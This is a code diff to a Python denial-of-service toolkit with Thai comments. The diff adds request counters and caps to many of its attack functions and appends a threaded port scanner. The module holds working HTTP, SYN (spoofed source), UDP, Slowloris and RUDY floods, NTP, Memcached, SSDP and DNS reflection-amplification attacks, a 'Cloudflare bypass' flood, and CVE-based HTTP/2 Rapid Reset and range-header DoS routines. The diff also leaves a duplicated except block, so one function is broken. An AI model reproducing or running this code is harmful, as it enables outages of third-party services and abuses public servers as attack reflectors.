@@ -5,63 +5,89 @@ import time  # นำเข้าโมดูล time สำหรับจั�
 import requests  # นำเข้าโมดูล requests สำหรับ HTTP requests
 import asyncio  # นำเข้าโมดูล asyncio สำหรับ async programming
 import aiohttp  # นำเข้าโมดูล aiohttp สำหรับ async HTTP
+import concurrent.futures  # นำเข้าโมดูล concurrent.futures สำหรับ ThreadPoolExecutor
 from scapy.all import *  # นำเข้าโมดูล scapy สำหรับ packet crafting
 from .config import CONFIG  # นำเข้าการตั้งค่าจาก config
 from .utils import get_random_headers, load_file_lines  # นำเข้าฟังก์ชันยูทิลิตี้
 
 
-# Layer 7 HTTP Flood (with proxies support)  # คอมเมนต์ภาษาอังกฤษสำหรับฟังก์ชัน
-def http_flood(url, duration, proxies=None):  # ฟังก์ชันโจมตี HTTP Flood พื้นฐาน
-    """Basic HTTP GET flood with proxy support"""  # คอมเมนต์ภาษาอังกฤษของฟังก์ชัน
+# Layer 7 HTTP Flood (with proxies support)  # สำหรับฟังก์ชัน
+def http_flood(url, duration, proxies=None, monitor=None, max_requests=0):  # ฟังก์ชันโจมตี HTTP Flood พื้นฐาน
+    """Basic HTTP GET flood with proxy support"""  # ของฟังก์ชัน
     end_time = time.time() + duration  # คำนวณเวลาสิ้นสุดการโจมตี
     session = requests.Session()  # สร้าง session สำหรับ HTTP requests
 
     while time.time() < end_time:  # วนลูปจนกว่าจะถึงเวลาสิ้นสุด
+        if max_requests > 0 and monitor and monitor.packets_sent >= max_requests:
+            break
+
         try:  # ลองส่งคำขอ
             proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None  # เลือกพร็อกซีแบบสุ่ม
-            session.get(url, headers=get_random_headers(), proxies=proxy, timeout=5)  # ส่ง GET request
+            response = session.get(url, headers=get_random_headers(), proxies=proxy, timeout=5)  # ส่ง GET request
+            if monitor:  # ถ้ามี monitor
+                monitor.update_stats(packets=1, bytes_sent=len(response.content) if response.content else 0)  # อัปเดตสถิติ
         except Exception as e:  # จัดการข้อผิดพลาด
+            if monitor:  # ถ้ามี monitor
+                monitor.update_stats(failed=1)  # อัปเดตสถิติการล้มเหลว
             continue  # ข้ามไปทำต่อ
 
 
-# Async Layer 7 Advanced (aiohttp for faster)  # คอมเมนต์ภาษาอังกฤษสำหรับฟังก์ชัน
-async def async_http_flood(url, duration, proxies_list):  # ฟังก์ชันโจมตี HTTP Flood แบบ async
-    """Advanced asynchronous HTTP flood"""  # คอมเมนต์ภาษาอังกฤษของฟังก์ชัน
+# Async Layer 7 Advanced (aiohttp for faster)  # สำหรับฟังก์ชัน
+async def async_http_flood(url, duration, proxies_list, monitor=None, max_requests=0):  # ฟังก์ชันโจมตี HTTP Flood แบบ async
+    """Advanced asynchronous HTTP flood"""  # ของฟังก์ชัน
     connector = aiohttp.TCPConnector(limit=1000)  # สร้าง connector ที่จำกัดการเชื่อมต่อ
     async with aiohttp.ClientSession(connector=connector) as session:  # สร้าง session async ด้วย connector
         end_time = time.time() + duration  # คำนวณเวลาสิ้นสุด
         tasks = []  # ลิสต์เก็บ tasks
 
         while time.time() < end_time:  # วนลูปจนกว่าจะถึงเวลาสิ้นสุด
+            if max_requests > 0 and monitor and monitor.packets_sent >= max_requests:
+                break
+
             proxy = random.choice(proxies_list) if proxies_list else None  # เลือกพร็อกซีแบบสุ่ม
             tasks.append(session.get(url, headers=get_random_headers(), proxy=proxy))  # เพิ่ม task
 
             if len(tasks) >= 1000:  # ถ้ามี tasks เยอะ
-                await asyncio.gather(*tasks, return_exceptions=True)  # รัน tasks พร้อมกัน
+                results = await asyncio.gather(*tasks, return_exceptions=True)  # รัน tasks พร้อมกัน
+                if monitor:  # ถ้ามี monitor
+                    successful = sum(1 for r in results if not isinstance(r, Exception))  # นับ requests ที่สำเร็จ
+                    failed = len(results) - successful  # นับ requests ที่ล้มเหลว
+                    monitor.update_stats(packets=successful, failed=failed)  # อัปเดตสถิติ
                 tasks = []  # ล้างลิสต์
 
         if tasks:  # ถ้ายังมี tasks ค้าง
-            await asyncio.gather(*tasks, return_exceptions=True)  # รัน tasks ที่เหลือ
+            results = await asyncio.gather(*tasks, return_exceptions=True)  # รัน tasks ที่เหลือ
+            if monitor:  # ถ้ามี monitor
+                successful = sum(1 for r in results if not isinstance(r, Exception))  # นับ requests ที่สำเร็จ
+                failed = len(results) - successful  # นับ requests ที่ล้มเหลว
+                monitor.update_stats(packets=successful, failed=failed)  # อัปเดตสถิติ
 
 
-# Layer 4 SYN Flood (spoof IP)  # คอมเมนต์ภาษาอังกฤษสำหรับฟังก์ชัน
-def syn_flood(target_ip, target_port, duration):  # ฟังก์ชันโจมตี SYN Flood
-    """TCP SYN flood with IP spoofing"""  # คอมเมนต์ภาษาอังกฤษของฟังก์ชัน
+# Layer 4 SYN Flood (spoof IP)  # สำหรับฟังก์ชัน
+def syn_flood(target_ip, target_port, duration, monitor=None, max_requests=0):  # ฟังก์ชันโจมตี SYN Flood
+    """TCP SYN flood with IP spoofing"""  # ของฟังก์ชัน
     end_time = time.time() + duration  # คำนวณเวลาสิ้นสุด
 
     while time.time() < end_time:  # วนลูปจนกว่าจะถึงเวลาสิ้นสุด
+        if max_requests > 0 and monitor and monitor.packets_sent >= max_requests:
+            break
+
         try:  # ลองส่งแพ็กเก็ต
             ip = IP(src=RandIP(), dst=target_ip)  # สร้าง IP header ด้วย IP ปลอม
             tcp = TCP(sport=RandShort(), dport=target_port, flags="S")  # สร้าง TCP header ด้วย SYN flag
             raw = Raw(b"X" * 1024)  # เพิ่มข้อมูลสุ่ม
             send(ip / tcp / raw, loop=0, verbose=0)  # ส่งแพ็กเก็ต
+            if monitor:  # ถ้ามี monitor
+                monitor.update_stats(packets=1, bytes_sent=1024)  # อัปเดตสถิติ
         except Exception as e:  # จัดการข้อผิดพลาด
+            if monitor:  # ถ้ามี monitor
+                monitor.update_stats(failed=1)  # อัปเดตสถิติการล้มเหลว
             continue  # ข้ามไปทำต่อ
 
 
-# Layer 4 UDP Flood  # คอมเมนต์ภาษาอังกฤษสำหรับฟังก์ชัน
-def udp_flood(target_ip, target_port, duration):  # ฟังก์ชันโจมตี UDP Flood
-    """UDP flood with random data"""  # คอมเมนต์ภาษาอังกฤษของฟังก์ชัน
+# Layer 4 UDP Flood  # สำหรับฟังก์ชัน
+def udp_flood(target_ip, target_port, duration, monitor=None, max_requests=0):  # ฟังก์ชันโจมตี UDP Flood
+    """UDP flood with random data"""  # ของฟังก์ชัน
     end_time = time.time() + duration  # คำนวณเวลาสิ้นสุด
 
     try:  # ลองสร้าง socket และส่งข้อมูล
@@ -69,8 +95,15 @@ def udp_flood(target_ip, target_port, duration):  # ฟังก์ชันโ�
         bytes_data = random._urandom(1490)  # สร้างข้อมูลสุ่มขนาด 1490 ไบต์
 
         while time.time() < end_time:  # วนลูปจนกว่าจะถึงเวลาสิ้นสุด
+            if max_requests > 0 and monitor and monitor.packets_sent >= max_requests:
+                break
+
             sock.sendto(bytes_data, (target_ip, target_port))  # ส่งข้อมูลไปยังเป้าหมาย
+            if monitor:  # ถ้ามี monitor
+                monitor.update_stats(packets=1, bytes_sent=1490)  # อัปเดตสถิติ
     except Exception as e:  # จัดการข้อผิดพลาด
+        if monitor:  # ถ้ามี monitor
+            monitor.update_stats(failed=1)  # อัปเดตสถิติการล้มเหลว
         pass  # ไม่ทำอะไร
     finally:  # ทำงานเสมอ
         try:  # ลองปิด socket
@@ -79,9 +112,9 @@ def udp_flood(target_ip, target_port, duration):  # ฟังก์ชันโ�
             pass  # ไม่ทำอะไร
 
 
-# Slowloris Attack (Layer 7)  # คอมเมนต์ภาษาอังกฤษสำหรับฟังก์ชัน
+# Slowloris Attack (Layer 7)  # สำหรับฟังก์ชัน
 def slowloris_attack(target_ip, target_port, duration, socket_count=500):  # ฟังก์ชันโจมตี Slowloris
-    """Slowloris attack - keeps connections open with partial headers"""  # คอมเมนต์ภาษาอังกฤษของฟังก์ชัน
+    """Slowloris attack - keeps connections open with partial headers"""  # ของฟังก์ชัน
     sockets = []  # ลิสต์เก็บ socket ต่างๆ
     end_time = time.time() + duration  # คำนวณเวลาสิ้นสุด
 
@@ -116,7 +149,7 @@ def slowloris_attack(target_ip, target_port, duration, socket_count=500):  # ฟ
             keep_alive(sock)  # รักษาการเชื่อมต่อ
         time.sleep(1)  # รอ 1 วินาที
 
-    # Cleanup  # คอมเมนต์ภาษาอังกฤษสำหรับการทำความสะอาด
+    # Cleanup  # สำหรับการทำความสะอาด
     for sock in sockets:  # วนลูปทุกรายการในลิสต์
         try:  # ลองปิด socket
             sock.close()  # ปิด socket
@@ -124,9 +157,9 @@ def slowloris_attack(target_ip, target_port, duration, socket_count=500):  # ฟ
             pass  # ข้ามไป
 
 
-# NTP Amplification Attack  # คอมเมนต์ภาษาอังกฤษสำหรับฟังก์ชัน
-def ntp_amplification(target_ip, target_port, duration):  # ฟังก์ชันโจมตี NTP Amplification
-    """NTP amplification attack using vulnerable NTP servers"""  # คอมเมนต์ภาษาอังกฤษของฟังก์ชัน
+# NTP Amplification Attack  # สำหรับฟังก์ชัน
+def ntp_amplification(target_ip, target_port, duration, monitor=None, max_requests=0):  # ฟังก์ชันโจมตี NTP Amplification
+    """NTP amplification attack using vulnerable NTP servers"""  # ของฟังก์ชัน
     default_servers = [  # ลิสต์เซิร์ฟเวอร์ NTP เริ่มต้น
         "time.nist.gov", "pool.ntp.org", "time.windows.com",  # เซิร์ฟเวอร์ NTP ต่างๆ
         "ntp.ubuntu.com", "us.pool.ntp.org", "asia.pool.ntp.org"  # เซิร์ฟเวอร์ NTP เพิ่มเติม
@@ -137,14 +170,21 @@ def ntp_amplification(target_ip, target_port, duration):  # ฟังก์ช�
 
     def ntp_query(server_ip):  # ฟังก์ชันภายในสำหรับส่ง NTP query
         while time.time() < end_time:  # วนลูปจนกว่าจะถึงเวลาสิ้นสุด
+            if max_requests > 0 and monitor and monitor.packets_sent >= max_requests:
+                break
+
             try:  # ลองส่ง NTP packet
-                # NTP monlist query (amplification factor ~500x)  # คอมเมนต์ภาษาอังกฤษ
+                # NTP monlist query (amplification factor ~500x)  # 
                 ntp_packet = b'\x17\x00\x03\x2a\x00\x00\x00\x00' + b'\x00' * 40  # สร้าง NTP packet สำหรับ monlist
                 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # สร้าง UDP socket
                 sock.sendto(ntp_packet, (server_ip, 123))  # ส่งไปยังพอร์ต NTP (123)
                 sock.close()  # ปิด socket
+                if monitor:
+                    monitor.update_stats(packets=1, bytes_sent=48)
                 time.sleep(0.01)  # รอเล็กน้อย
             except Exception as e:  # จัดการข้อผิดพลาด
+                if monitor:
+                    monitor.update_stats(failed=1)
                 continue  # ข้ามไปทำต่อ
 
     print(f"Starting NTP amplification attack on {target_ip}:{target_port}")  # แสดงข้อความเริ่มโจมตี
@@ -161,14 +201,14 @@ def ntp_amplification(target_ip, target_port, duration):  # ฟังก์ช�
         except:  # ถ้าแปลงไม่ได้
             continue  # ข้ามไป
 
-    # Wait for all threads to complete  # คอมเมนต์ภาษาอังกฤษ
+    # Wait for all threads to complete  # 
     for t in threads:  # วนลูปทุกรายการในลิสต์
         t.join(timeout=1)  # รอให้ thread เสร็จ (timeout 1 วินาที)
 
 
-# Cloudflare Bypass Techniques  # คอมเมนต์ภาษาอังกฤษสำหรับฟังก์ชัน
-def cloudflare_bypass_flood(url, duration, proxies=None):  # ฟังก์ชันโจมตี Cloudflare Bypass
-    """HTTP flood with Cloudflare bypass techniques"""  # คอมเมนต์ภาษาอังกฤษของฟังก์ชัน
+# Cloudflare Bypass Techniques  # สำหรับฟังก์ชัน
+def cloudflare_bypass_flood(url, duration, proxies=None, monitor=None, max_requests=0):  # ฟังก์ชันโจมตี Cloudflare Bypass
+    """HTTP flood with Cloudflare bypass techniques"""  # ของฟังก์ชัน
     end_time = time.time() + duration  # คำนวณเวลาสิ้นสุด
 
     bypass_headers = [  # ลิสต์ของ headers สำหรับ bypass Cloudflare
@@ -199,6 +239,9 @@ def cloudflare_bypass_flood(url, duration, proxies=None):  # ฟังก์ช�
     session = requests.Session()  # สร้าง HTTP session
 
     while time.time() < end_time:  # วนลูปจนกว่าจะถึงเวลาสิ้นสุด
+        if max_requests > 0 and monitor and monitor.packets_sent >= max_requests:
+            break
+
         try:  # ลองส่งคำขอ
             headers = random.choice(bypass_headers)  # เลือก headers แบบสุ่ม
             proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None  # เลือกพร็อกซี
@@ -208,21 +251,26 @@ def cloudflare_bypass_flood(url, duration, proxies=None):  # ฟังก์ช�
             methods = [session.get, session.post, session.head]  # ลิสต์ของ HTTP methods
             method = random.choice(methods)  # เลือก method แบบสุ่ม
 
-            methods = [session.get, session.post, session.head]  # ลิสต์ของ HTTP methods
-            method = random.choice(methods)  # เลือก method แบบสุ่ม
-
             if method == session.post:  # ถ้าเป็น POST
                 method(url, headers=headers, proxies=proxy, data={"data": random.random()}, timeout=10)  # ส่ง POST ด้วยข้อมูลสุ่ม
             else:  # ถ้าเป็น GET หรือ HEAD
                 method(url, headers=headers, proxies=proxy, timeout=10)  # ส่งคำขอปกติ
+            
+            if monitor:
+                monitor.update_stats(packets=1)
+
+        except Exception as e:  # จัดการข้อผิดพลาด
+            if monitor:
+                monitor.update_stats(failed=1)
+            continue  # ข้ามไปทำต่อ
 
         except Exception as e:  # จัดการข้อผิดพลาด
             continue  # ข้ามไปทำต่อ
 
 
-# Memcached / SSDP / DNS Amplification Module  # คอมเมนต์ภาษาอังกฤษสำหรับโมดูลใหม่
+# Memcached / SSDP / DNS Amplification Module  # สำหรับโมดูลใหม่
 def memcached_amplification(target_ip, target_port, duration):  # ฟังก์ชันโจมตี Memcached Amplification
-    """Memcached amplification attack using vulnerable servers"""  # คอมเมนต์ภาษาอังกฤษของฟังก์ชัน
+    """Memcached amplification attack using vulnerable servers"""  # ของฟังก์ชัน
     default_servers = [  # ลิสต์เซิร์ฟเวอร์ Memcached เริ่มต้น
         "8.8.8.8:11211", "1.1.1.1:11211", "208.67.222.222:11211"  # เซิร์ฟเวอร์ Memcached ที่อาจมีช่องโหว่
     ]
@@ -233,7 +281,7 @@ def memcached_amplification(target_ip, target_port, duration):  # ฟังก�
     def memcached_query(server_ip, server_port):  # ฟังก์ชันภายในสำหรับส่ง Memcached query
         while time.time() < end_time:  # วนลูปจนกว่าจะถึงเวลาสิ้นสุด
             try:  # ลองส่ง Memcached packet
-                # Memcached get command for amplification (amplification factor ~10,000x-50,000x)  # คอมเมนต์ภาษาอังกฤษ
+                # Memcached get command for amplification (amplification factor ~10,000x-50,000x)  # 
                 memcached_packet = b"get large_key_that_does_not_exist\r\n"  # คำสั่ง Memcached ที่จะถูก amplify
                 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # สร้าง UDP socket
                 sock.sendto(memcached_packet, (server_ip, int(server_port)))  # ส่งไปยังเซิร์ฟเวอร์ Memcached
@@ -262,7 +310,7 @@ def memcached_amplification(target_ip, target_port, duration):  # ฟังก�
 
 
 def ssdp_amplification(target_ip, target_port, duration):  # ฟังก์ชันโจมตี SSDP Amplification
-    """SSDP amplification attack using UPnP devices"""  # คอมเมนต์ภาษาอังกฤษของฟังก์ชัน
+    """SSDP amplification attack using UPnP devices"""  # ของฟังก์ชัน
     default_servers = [  # ลิสต์เซิร์ฟเวอร์ SSDP เริ่มต้น
         "239.255.255.250:1900"  # multicast address สำหรับ SSDP
     ]
@@ -273,7 +321,7 @@ def ssdp_amplification(target_ip, target_port, duration):  # ฟังก์ช�
     def ssdp_query(server_ip, server_port):  # ฟังก์ชันภายในสำหรับส่ง SSDP query
         while time.time() < end_time:  # วนลูปจนกว่าจะถึงเวลาสิ้นสุด
             try:  # ลองส่ง SSDP packet
-                # SSDP M-SEARCH request for amplification (amplification factor ~30x)  # คอมเมนต์ภาษาอังกฤษ
+                # SSDP M-SEARCH request for amplification (amplification factor ~30x)  # 
                 ssdp_packet = b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 10\r\nST: ssdp:all\r\n\r\n'  # คำขอ SSDP ที่จะถูก amplify
                 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # สร้าง UDP socket
                 sock.sendto(ssdp_packet, (server_ip, int(server_port)))  # ส่งไปยังเซิร์ฟเวอร์ SSDP
@@ -302,7 +350,7 @@ def ssdp_amplification(target_ip, target_port, duration):  # ฟังก์ช�
 
 
 def dns_amplification(target_ip, target_port, duration):  # ฟังก์ชันโจมตี DNS Amplification
-    """DNS amplification attack using open DNS resolvers"""  # คอมเมนต์ภาษาอังกฤษของฟังก์ชัน
+    """DNS amplification attack using open DNS resolvers"""  # ของฟังก์ชัน
     default_servers = [  # ลิสต์เซิร์ฟเวอร์ DNS เริ่มต้น
         "8.8.8.8", "1.1.1.1", "208.67.222.222"  # DNS resolvers ที่อาจถูกใช้
     ]
@@ -313,7 +361,7 @@ def dns_amplification(target_ip, target_port, duration):  # ฟังก์ช�
     def dns_query(server_ip):  # ฟังก์ชันภายในสำหรับส่ง DNS query
         while time.time() < end_time:  # วนลูปจนกว่าจะถึงเวลาสิ้นสุด
             try:  # ลองส่ง DNS packet
-                # DNS ANY query for large domain (amplification factor ~50x-100x)  # คอมเมนต์ภาษาอังกฤษ
+                # DNS ANY query for large domain (amplification factor ~50x-100x)  # 
                 dns_packet = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\xff\x00\x01'  # DNS query ที่จะถูก amplify
                 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # สร้าง UDP socket
                 sock.sendto(dns_packet, (server_ip, 53))  # ส่งไปยัง DNS server (พอร์ต 53)
@@ -340,9 +388,9 @@ def dns_amplification(target_ip, target_port, duration):  # ฟังก์ช�
         t.join(timeout=1)  # รอให้ thread เสร็จ (timeout 1 วินาที)
 
 
-# RUDY (R U Dead Yet?) Attack  # คอมเมนต์ภาษาอังกฤษสำหรับฟังก์ชัน
+# RUDY (R U Dead Yet?) Attack  # สำหรับฟังก์ชัน
 def rudy_attack(target_ip, target_port, duration, content_length=1000000):  # ฟังก์ชันโจมตี RUDY
-    """RUDY (R U Dead Yet?) attack - slow POST with byte-by-byte data sending"""  # คอมเมนต์ภาษาอังกฤษของฟังก์ชัน
+    """RUDY (R U Dead Yet?) attack - slow POST with byte-by-byte data sending"""  # ของฟังก์ชัน
     sockets = []  # ลิสต์เก็บ socket ต่างๆ
     end_time = time.time() + duration  # คำนวณเวลาสิ้นสุด
 
@@ -391,9 +439,9 @@ def rudy_attack(target_ip, target_port, duration, content_length=1000000):  # �
             pass  # ข้ามไป
 
 
-# HOIC Mode (High Orbit Ion Cannon)  # คอมเมนต์ภาษาอังกฤษสำหรับฟังก์ชัน
+# HOIC Mode (High Orbit Ion Cannon)  # สำหรับฟังก์ชัน
 def hoic_attack(url, duration, proxies=None):  # ฟังก์ชันโจมตี HOIC Style
-    """HOIC-style multi-vector attack (GET + POST + HEAD mixed)"""  # คอมเมนต์ภาษาอังกฤษของฟังก์ชัน
+    """HOIC-style multi-vector attack (GET + POST + HEAD mixed)"""  # ของฟังก์ชัน
     end_time = time.time() + duration  # คำนวณเวลาสิ้นสุด
     session = requests.Session()  # สร้าง session สำหรับ HTTP requests
 
@@ -424,9 +472,9 @@ def hoic_attack(url, duration, proxies=None):  # ฟังก์ชันโจ�
             continue  # ข้ามไปทำต่อ
 
 
-# Application Layer Exploits Combo  # คอมเมนต์ภาษาอังกฤษสำหรับฟังก์ชัน
+# Application Layer Exploits Combo  # สำหรับฟังก์ชัน
 def http2_rapid_reset(url, duration, proxies=None):  # ฟังก์ชันโจมตี HTTP/2 Rapid Reset
-    """HTTP/2 Rapid Reset attack (CVE-2023-44487)"""  # คอมเมนต์ภาษาอังกฤษของฟังก์ชัน
+    """HTTP/2 Rapid Reset attack (CVE-2023-44487)"""  # ของฟังก์ชัน
     end_time = time.time() + duration  # คำนวณเวลาสิ้นสุด
     session = requests.Session()  # สร้าง session สำหรับ HTTP requests
 
@@ -446,7 +494,7 @@ def http2_rapid_reset(url, duration, proxies=None):  # ฟังก์ชัน�
 
 
 def apache_killer(url, duration, proxies=None):  # ฟังก์ชันโจมตี Apache Killer
-    """Apache Range Header DoS attack"""  # คอมเมนต์ภาษาอังกฤษของฟังก์ชัน
+    """Apache Range Header DoS attack"""  # ของฟังก์ชัน
     end_time = time.time() + duration  # คำนวณเวลาสิ้นสุด
     session = requests.Session()  # สร้าง session สำหรับ HTTP requests
 
@@ -466,7 +514,7 @@ def apache_killer(url, duration, proxies=None):  # ฟังก์ชันโ�
 
 
 def nginx_range_dos(url, duration, proxies=None):  # ฟังก์ชันโจมตี Nginx Range DoS
-    """Nginx Range Header DoS attack"""  # คอมเมนต์ภาษาอังกฤษของฟังก์ชัน
+    """Nginx Range Header DoS attack"""  # ของฟังก์ชัน
     end_time = time.time() + duration  # คำนวณเวลาสิ้นสุด
     session = requests.Session()  # สร้าง session สำหรับ HTTP requests
 
@@ -482,3 +530,43 @@ def nginx_range_dos(url, duration, proxies=None):  # ฟังก์ชันโ
 
         except Exception as e:  # จัดการข้อผิดพลาด
             continue  # ข้ามไปทำต่อ
+
+
+def port_scanner(target, ports, threads):
+    """Port scanner function with service identification"""
+    # Common ports directory
+    COMMON_PORTS = {
+        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
+        53: "DNS", 80: "HTTP", 110: "POP3", 115: "SFTP",
+        135: "Microsoft RPC", 139: "NetBIOS", 143: "IMAP",
+        161: "SNMP", 443: "HTTPS", 445: "Microsoft-DS (SMB)",
+        1433: "SQL Server", 3306: "MySQL", 3389: "RDP",
+        5432: "PostgreSQL", 5900: "VNC", 8080: "HTTP-Proxy",
+        25565: "Minecraft", 30120: "FiveM/GTA", 7777: "SA-MP"
+    }
+
+    def scan_port(port):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(1)
+            result = sock.connect_ex((target, port))
+            sock.close()
+            return port if result == 0 else None
+        except:
+            return None
+
+    open_ports = []
+    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
+        futures = [executor.submit(scan_port, port) for port in ports]
+        for future in concurrent.futures.as_completed(futures):
+            result = future.result()
+            if result:
+                open_ports.append(result)
+                service = COMMON_PORTS.get(result, "Unknown Service")
+                print(f"[+] Port {result} is OPEN ({service})")
+
+    print(f"\n[!] Scan complete. Total open ports: {len(open_ports)}")
+    for port in sorted(open_ports):
+        service = COMMON_PORTS.get(port, "Unknown")
+        print(f"    - {port}: {service}")
+
